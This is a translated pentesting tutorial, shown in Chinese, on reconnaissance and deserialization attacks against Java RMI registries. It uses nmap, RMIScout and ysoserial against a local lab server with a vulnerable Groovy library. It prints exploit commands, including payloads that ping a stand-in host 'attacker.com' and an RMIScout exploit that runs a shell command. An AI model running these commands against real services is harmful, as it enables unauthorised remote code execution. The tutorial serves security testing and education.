<html>
<head>
<title>Java RMI for pentesters part two — reconnaissance &amp; attack against non-JMX registries</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">pentesters的Java RMI第二部分——对非JMX注册中心的侦察和攻击</h1>
<blockquote>原文：<a href="https://itnext.io/java-rmi-for-pentesters-part-two-reconnaissance-attack-against-non-jmx-registries-187a6561314d?source=collection_archive---------0-----------------------#2020-10-08">https://itnext.io/java-rmi-for-pentesters-part-two-reconnaissance-attack-against-non-jmx-registries-187a6561314d?source=collection_archive---------0-----------------------#2020-10-08</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="24d4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是“pentesters的Java RMI”文章的第二部分。第一部分可以在这里找到<a class="ae kl" href="https://medium.com/@afinepl/java-rmi-for-pentesters-structure-recon-and-communication-non-jmx-registries-a10d5c996a79" rel="noopener"/>，你可以从中了解什么是Java RMI注册中心(我主要说的是非JMX注册中心)以及如何与它们交互。</p><p id="9293" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在当前部分，我们将讨论实际的自动侦察以及针对它们的攻击。本文将使用RMI接口/服务器，这在第一部分中已经介绍并详细解释过了。它的源代码也可以在GitHub上找到，<a class="ae kl" href="https://github.com/0xluk3/simple-rmi" rel="noopener ugc nofollow" target="_blank">这里</a>。</p><h1 id="dc2b" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">再鉴定</h1><p id="60f6" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">按照本文的第一部分启动RMIRegistry服务器，并对其运行nmap扫描(事实上，扫描任何RMI注册表都会得到以下结果。为了以防万一，您可以使用第一部分中的示例代码。</p><pre class="lp lq lr ls gt lt lu lv lw aw lx bi"><span id="0f36" class="ly kn iq lu b gy lz ma l mb mc">nmap -v -Pn -p 11099 -sV — script=+rmi-dumpregistry 127.0.0.1</span></pre><figure class="lp lq lr ls gt me gh gi paragraph-image"><div class="gh gi md"><img src="../Images/153bc0fbdad21573a656b3f4c13105c7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1210/format:webp/1*FfvHqqluOA2U_H9C_FVlBQ.png"/></div></figure><p id="e93a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们看看如何针对上述接口使用RMIScout工具。RMIScout的目的是猜测RMI接口上可用的方法。一旦完成，您就可以按照第一部分实现自己的接口和客户机，并尝试执行这些方法。但是，请注意，对您不拥有的资产盲目执行某些操作可能会产生不可预知的副作用，包括永久损坏该资产。在这样做之前，确保它的所有者意识到潜在的风险(虽然像String getVersion()这样的方法相当安全，但是千万不要调用shutDown()这样的方法)</p><p id="c278" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以按照GitHub描述安装RMIScout:</p><pre class="lp lq lr ls gt lt lu lv lw aw lx bi"><span id="dcaa" class="ly kn iq lu b gy lz ma l mb mc">Git clone <a class="ae kl" href="https://github.com/BishopFox/rmiscout.git" rel="noopener ugc nofollow" target="_blank">https://github.com/BishopFox/rmiscout.git</a></span><span id="591d" class="ly kn iq lu b gy mh ma l mb mc">cd rmiscout/</span><span id="7e2a" class="ly kn iq lu b gy mh ma l mb mc">./gradlew shadowJar</span></pre><p id="a66c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我正在用GitHub页面上描述的Gradle构建它，但是你也可以在这里下载预构建的版本<a class="ae kl" href="https://github.com/BishopFox/rmiscout/releases/tag/v1.03" rel="noopener ugc nofollow" target="_blank">。</a></p><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mi"><img src="../Images/c4687af3485180daaad8989d818320b3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ISSIIMOMCIrz_vHOdXE-sA.png"/></div></div></figure><p id="90d8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对于潜在函数的侦察，RMIScout提供了两种模式:检查函数签名(单词列表模式)和bruteforce模式。</p><p id="16a9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查函数签名的命令是</p><pre class="lp lq lr ls gt lt lu lv lw aw lx bi"><span id="a657" class="ly kn iq lu b gy lz ma l mb mc">./rmiscout.sh wordlist -i lists/prototypes.txt localhost 11099</span></pre><p id="c6ca" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你看一下单词表，你会看到这些原型是什么样子的:</p><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mn"><img src="../Images/0b79eab09ca69163b7777c4cfee0e4b8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*x368yiB4cMaBmrWBQFzkmQ.png"/></div></div></figure><p id="1dee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">值得一提的是，参数名称是不相关的。他们堪称典范，因为他们显然不可能不出名。</p><p id="894c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">为了便于练习，我们向下滚动列表，添加默认情况下不在列表中的echo功能。如果不手动添加，就检测不到！</strong></p><pre class="lp lq lr ls gt lt lu lv lw aw lx bi"><span id="9a9f" class="ly kn iq lu b gy lz ma l mb mc">String echo(Object randomParamName)</span></pre><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mo"><img src="../Images/0c7d486800dd179dfad9fc9dac01e306.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GAHQ_dm2aZOY5nYmysKAQg.png"/></div></div></figure><p id="5f58" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，保存单词列表并对注册表运行RMIScout:</p><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mp"><img src="../Images/f1942d4e424747326c4c191b01e0f592.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mCKxO0HkxUsp3h6Q_Hbo_w.png"/></div></div></figure><p id="ca60" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">“Skipping…”输出只是为了提供信息，这些函数出现在单词表中，但是由于没有参数而被跳过。有趣的是绿色输出。</p><p id="9259" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如您所见，已经确定了一个函数。即使您不知道接口实现，现在也可以用本文第一部分介绍的echo函数创建一个。</p><p id="66bb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">RMIScout中的另一个可用模式是bruteforce。它不需要猜测硬编码的方法签名，而是允许搜索标准更加多样化。可以使用以下命令运行它:</p><pre class="lp lq lr ls gt lt lu lv lw aw lx bi"><span id="403a" class="ly kn iq lu b gy lz ma l mb mc">./rmiscout.sh bruteforce -i lists/methods.txt -r void,String -p String,Object -l 1,2 localhost 11099</span></pre><p id="3a44" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你看一下methods.txt，你会发现它只包含函数名。我们将在列表的末尾添加“echo ”,这样我们的非标准方法名就会被检测到。记得在那种状态下保存单词表！</p><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mq"><img src="../Images/5de1b66fcb1dd1c79985ed1e7238d771.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xotAuGkW8l74G_rAX8EX9g.png"/></div></div></figure><p id="109e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">其余的暴力模式参数如下:</p><p id="a4f3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">-r返回的数据类型</p><p id="d762" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">-p要查找的参数类型</p><p id="8030" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">-l range [from，to]函数应该接受多少个参数作为输入。</p><p id="35fd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">RMIScout将使用这些数据生成排列(函数、参数类型和返回类型的组合),并尝试根据远程注册表猜测它们。现在，再次运行该工具将显示方法“echo”存在于远程接口上。</p><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mr"><img src="../Images/796c25a292839ee886f7f561e0392741.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ePRARFL3C7iK3CT5dpfDNA.png"/></div></div></figure><h1 id="52ad" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">历史攻击</h1><p id="5763" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">从历史的角度来看，可以使用<a class="ae kl" href="https://github.com/frohoff/ysoserial" rel="noopener ugc nofollow" target="_blank"> ysoserial的</a>实用程序——rmregistryexploit和JRMPClient在远程接口上获得几乎100%确定的RCE(假设过去几乎每个类路径上都存在易受攻击的库)。这两个内置功能的设计是为了滥用RMI注册中心的一些非常复杂的内部特性，所以我在这里不做描述。简而言之，RMIRegistryExploit利用了一个事实，即RMI注册中心利用Java序列化进行通信，而JRMPClient利用分布式垃圾收集，这也可能以类似的方式被滥用。更多细节可以在<a class="ae kl" href="https://www.programmersought.com/article/22724621036/" rel="noopener ugc nofollow" target="_blank">这里</a>找到。</p><p id="aeaa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Ysoserial可以以其预编译形式下载。在它的<a class="ae kl" href="https://github.com/frohoff/ysoserial" rel="noopener ugc nofollow" target="_blank"> GitHub页面</a>上看看怎么做。</p><p id="a787" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用以下命令可以用ysoserial攻击RMIRegistries(如果旧的java仍然可以)。我假设下载的ysoserial的名称是ysoserial.jar</p><pre class="lp lq lr ls gt lt lu lv lw aw lx bi"><span id="f251" class="ly kn iq lu b gy lz ma l mb mc">java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit host port PayloadName command</span></pre><p id="4d48" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">或者</p><pre class="lp lq lr ls gt lt lu lv lw aw lx bi"><span id="3331" class="ly kn iq lu b gy lz ma l mb mc">java -cp ysoserial.jar ysoserial.exploit.JRMPClient host port payloadname command</span></pre><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi ms"><img src="../Images/94cfb225185bf18fa6a0e1d711fe3b04.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_G21oT5KC2aTTy6BxWVnrA.png"/></div></div></figure><p id="bed1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">其中<em class="mt"> payloadname </em>是一个ysoserial有效载荷，而<em class="mt"> command </em>是该有效载荷要执行的命令。例如，<em class="mt"> payloadname命令</em>可以是:</p><p id="cbc3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="mt">URL DNS http://mycollabid.burpcollaborator.net</em></p><p id="dae7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="mt">公选6《平attacker.com-C3》</em></p><p id="cd9c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这两种情况下，ysoserial将执行以下操作</p><p id="8e49" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在<em class="mt">主机:端口</em>连接到远程注册表</p><p id="bd53" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">尝试注入序列化的有效负载</p><p id="0203" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果PayloadName可以被反序列化(所有的小工具都在远程类路径上，并且有旧的java版本在使用)，那么代码即将被执行</p><p id="cb2e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">反向外壳/ DNS查找检查部分在你这边</p><p id="fb6b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如上所述，这是一个历史性的方法，但仍然有应用程序与旧java硬捆绑在一起，因此值得一试。java版本不应比JDK 1.7u21新，并且不应安装被视为易受攻击的JEP290修补程序。</p><p id="faaf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">等一下！</strong></p><p id="4b17" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你喜欢这篇文章吗？想让<strong class="jp ir">了解最新<strong class="jp ir">网络安全内容的最新</strong>？</strong></p><p id="e272" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kl" href="https://newsletter.afine.academy/join" rel="noopener ugc nofollow" target="_blank">订阅我们的<strong class="jp ir">免费</strong> <strong class="jp ir">简讯</strong> —点击这里</a>！</p><div class="mu mv gp gr mw mx"><a href="https://newsletter.afine.academy/join" rel="noopener  ugc nofollow" target="_blank"><div class="my ab fo"><div class="mz ab na cl cj nb"><h2 class="bd ir gy z fp nc fr fs nd fu fw ip bi translated">AFINE网络通讯</h2><div class="ne l"><p class="bd b dl z fp nc fr fs nd fu fw dk translated">点击这里加入！</p></div></div><div class="nf l"><div class="ng l nh ni nj nf nk mf mx"/></div></div></a></div><h1 id="6e2d" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">JEP 290</h1><p id="e1e2" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">终止RMI注册表免费利用的是名为JEP 290的安全补丁。你可以在<a class="ae kl" href="https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/" rel="noopener ugc nofollow" target="_blank">这篇伟大的文章</a>中读到更多关于那个补丁的详细技术信息和它的含义。</p><p id="1985" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">简而言之，利用RMI注册表仍然是可能的，但是通过指定一个序列化的对象作为远程方法的参数。一个非常重要的注意事项——不是每个参数都可以用序列化对象替换；只有那些<em class="mt">非原始</em>数据类型。<a class="ae kl" href="https://en.wikibooks.org/wiki/Java_Programming/Primitive_Types" rel="noopener ugc nofollow" target="_blank">在这里</a>你可以看到哪些数据类型被认为是原语。</p><p id="f8cc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请注意，基本类型有相应的所谓包装类，这可能会令人困惑，如下例所示:</p><p id="e10f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">原语<em class="mt"> int </em> —有一个对应的包装类<em class="mt"> java.lang.Integer </em></p><p id="a1e1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">原语<em class="mt"> long </em> —有一个对应的包装类<em class="mt"> java.lang.Long </em></p><p id="af29" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">等等。</p><p id="5a42" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我不会深究基本类型和非基本类型的细节，但是对于那些感兴趣的人，你可以在这里看到关于包装类<a class="ae kl" href="https://programming.guide/java/wrapper-types.html" rel="noopener ugc nofollow" target="_blank">的更多信息。</a></p><p id="4551" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">简而言之，如果您正在处理一个运行在现代Java上的RMI注册表，并且您想通过反序列化攻击向量在其上执行代码，您需要:</p><p id="3b99" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">至少找到一种方法</p><p id="9abf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该方法应该利用一个非基元类型的参数</p><p id="ec03" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您需要用序列化对象替换该参数</p><p id="4b21" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当然，由ysoserial生成的小工具链也应该出现在远程类路径上，否则会得到ClassNotFoundException</p><p id="9471" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">例如，如果在远程注册表上发现了一个方法，其签名是</p><pre class="lp lq lr ls gt lt lu lv lw aw lx bi"><span id="e88f" class="ly kn iq lu b gy lz ma l mb mc">String(java.lang.Integer x)</span></pre><p id="0983" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您应该创建各自的接口/客户端，使用以下命令生成ysoserial有效负载</p><pre class="lp lq lr ls gt lt lu lv lw aw lx bi"><span id="4eb2" class="ly kn iq lu b gy lz ma l mb mc">java -jar ysoserial.jar CommonsCollections6 “ping attacker.com -c3”</span></pre><p id="8663" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">并以序列化的对象作为参数调用该方法…好吧，手动这是不可能的。你需要为此使用一个工具。例如，同样可以使用RMIScout(还有其他方法，但我发现RMIScout的实用程序最用户友好)。而且，它已经内置了ysoserial，所以在那种情况下真的很方便。</p><h1 id="741e" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">使用RMIScout和序列化负载攻击RMI</h1><p id="3601" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">我将向您展示如何使用RMIScout作为开发工具——这个例子非常简单，命令行已经记录在项目的<a class="ae kl" href="https://github.com/BishopFox/rmiscout" rel="noopener ugc nofollow" target="_blank"> GitHub页面</a>上。让我们看一下RMIRegistry的两个场景。请注意，下面的代码与<a class="ae kl" href="https://medium.com/@afinepl/java-rmi-for-pentesters-structure-recon-and-communication-non-jmx-registries-a10d5c996a79" rel="noopener">第一部分</a>中提供的<a class="ae kl" href="https://github.com/0xluk3/simple-rmi" rel="noopener ugc nofollow" target="_blank">代码非常相似，只有一点不同——增加了额外的方法。</a></p><pre class="lp lq lr ls gt lt lu lv lw aw lx bi"><span id="0cf4" class="ly kn iq lu b gy lz ma l mb mc"><strong class="lu ir">//RMIInterface.java</strong></span><span id="3d24" class="ly kn iq lu b gy mh ma l mb mc">import java.rmi.*;</span><span id="dddc" class="ly kn iq lu b gy mh ma l mb mc">import java.rmi.registry.*;</span><span id="3d5e" class="ly kn iq lu b gy mh ma l mb mc">import java.net.*;</span><span id="507c" class="ly kn iq lu b gy mh ma l mb mc">interface RMIInterface extends Remote {</span><span id="74f9" class="ly kn iq lu b gy mh ma l mb mc">public String echoObject(Object obj) throws RemoteException;</span><span id="15b9" class="ly kn iq lu b gy mh ma l mb mc">public String echoString(String str) throws RemoteException;</span><span id="d54a" class="ly kn iq lu b gy mh ma l mb mc">public String echoClass(Class cls) throws RemoteException;</span><span id="8aef" class="ly kn iq lu b gy mh ma l mb mc">public String echoInt(Integer inte) throws RemoteException;</span><span id="9006" class="ly kn iq lu b gy mh ma l mb mc">}</span><span id="d6aa" class="ly kn iq lu b gy mh ma l mb mc"><strong class="lu ir">//Server.java</strong></span><span id="9c5d" class="ly kn iq lu b gy mh ma l mb mc">import java.rmi.registry.Registry;</span><span id="0dd6" class="ly kn iq lu b gy mh ma l mb mc">import java.rmi.registry.LocateRegistry;</span><span id="580c" class="ly kn iq lu b gy mh ma l mb mc">import java.rmi.RemoteException;</span><span id="a63b" class="ly kn iq lu b gy mh ma l mb mc">import java.rmi.server.UnicastRemoteObject;</span><span id="242a" class="ly kn iq lu b gy mh ma l mb mc">import java.rmi.Naming;</span><span id="2781" class="ly kn iq lu b gy mh ma l mb mc">public class Server extends UnicastRemoteObject implements RMIInterface {</span><span id="390f" class="ly kn iq lu b gy mh ma l mb mc">public String echoObject(Object obj) throws RemoteException { return “Object: “ + obj.toString(); }</span><span id="5dfa" class="ly kn iq lu b gy mh ma l mb mc">public String echoString(String str) throws RemoteException { return “String: “ + str.toString(); }</span><span id="d531" class="ly kn iq lu b gy mh ma l mb mc">public String echoClass(Class cls) throws RemoteException { return “Class: “ + cls.toString(); }</span><span id="1ce8" class="ly kn iq lu b gy mh ma l mb mc">public String echoInt(Integer inte) throws RemoteException { Integer X = inte; return “Integer”; }</span><span id="fae0" class="ly kn iq lu b gy mh ma l mb mc">protected Server() throws RemoteException {</span><span id="99aa" class="ly kn iq lu b gy mh ma l mb mc">super();</span><span id="e24c" class="ly kn iq lu b gy mh ma l mb mc">}</span><span id="3854" class="ly kn iq lu b gy mh ma l mb mc">public static void main(String[] args) {</span><span id="fb98" class="ly kn iq lu b gy mh ma l mb mc">try {</span><span id="9d54" class="ly kn iq lu b gy mh ma l mb mc">System.out.println(“[+] Trying to bind…”);</span><span id="0e7f" class="ly kn iq lu b gy mh ma l mb mc">//Below IP:PORT can be changed</span><span id="0ea6" class="ly kn iq lu b gy mh ma l mb mc">Naming.rebind(“rmi://127.0.0.1:11098/RMIInterface”, new Server());</span><span id="9ac9" class="ly kn iq lu b gy mh ma l mb mc">System.out.println(“[+] Server started. “);</span><span id="9d43" class="ly kn iq lu b gy mh ma l mb mc">} catch (Exception e) {</span><span id="87a8" class="ly kn iq lu b gy mh ma l mb mc">e.printStackTrace();</span><span id="d910" class="ly kn iq lu b gy mh ma l mb mc">}</span><span id="f47f" class="ly kn iq lu b gy mh ma l mb mc">}</span><span id="7b03" class="ly kn iq lu b gy mh ma l mb mc">}</span></pre><p id="0b14" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在它是用命令编译的</p><pre class="lp lq lr ls gt lt lu lv lw aw lx bi"><span id="fa04" class="ly kn iq lu b gy lz ma l mb mc"> javac *.java</span></pre><p id="b3d3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此外，我们需要易受攻击的Groovy库——你可以从这里的<a class="ae kl" href="https://repo1.maven.org/maven2/org/codehaus/groovy/groovy-all/2.3.9/groovy-all-2.3.9.jar" rel="noopener ugc nofollow" target="_blank">下载。</a></p><p id="41df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">启动<em class="mt"> rmiregistry </em>之前的目录内容应该如下所示:</p><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nl"><img src="../Images/6aa499b22d7ce0c59e15dcfec9acefba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3XTbJ3vf86H1jw09MkxFWA.png"/></div></div></figure><p id="8c59" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我将确保没有其他注册表正在使用netstat运行，稍后我将运行新编译的服务器。注意，Groovy库现在已经被添加到了类路径中。</p><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nm"><img src="../Images/f0b19dae94ce6e043a282dc138d8c059.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_2byEL00pFGN0E_s2yTxcw.png"/></div></div></figure><p id="c472" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行nmap表明，注册表是可访问的，并且可以被转储:</p><pre class="lp lq lr ls gt lt lu lv lw aw lx bi"><span id="42d5" class="ly kn iq lu b gy lz ma l mb mc">nmap 127.0.0.1 -p 11098 -sV -v -Pn -T4 — script=+rmi-dumpregistry</span></pre><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nn"><img src="../Images/c1c1503eb6176ff8609cbd30b5a75388.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*INgEvhyE90FpEgACLdpfAA.png"/></div></div></figure><p id="f60a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在有趣的部分是:让我们尝试攻击注册表。我们已经知道接口是什么，并且已经说过如果没有接口该如何进行——试着找到它或者猜测它。</p><p id="515a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这种情况下，我将跳过侦察阶段，专注于方法执行。请注意，我们的接口有以下方法:</p><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi no"><img src="../Images/4149465eea28177d3de1111c1f62cfe1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pWE5k1_OtkZYDMdbZc3jnA.png"/></div></div></figure><p id="e84a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们还知道，远程注册表的类路径中包含易受攻击的Groovy库。因此，名为Groovy1的ysoserial有效载荷可用于利用它。</p><p id="ba1c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">整个问题是<strong class="jp ir">你不能简单地在你的函数实现中声明另一种类型的参数。如果接口提供了一个以Integer作为参数的函数，你将不能用一个对象类型的参数来调用这个函数。</strong></p><p id="a747" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这一次，RMIScout再次帮助我们实现了这一目标。让我们在利用模式下对注册表调用RMIScout:</p><pre class="lp lq lr ls gt lt lu lv lw aw lx bi"><span id="0365" class="ly kn iq lu b gy lz ma l mb mc">./rmiscout.sh exploit -s ‘String echoInt(java.lang.Integer x)’ -p ysoserial.payloads.Groovy1 -c “touch /tmp/grovy1” -n RMIInterface localhost 11098</span></pre><figure class="lp lq lr ls gt me gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi np"><img src="../Images/fbb05b46a236a69379da4d44d97883ff.png" 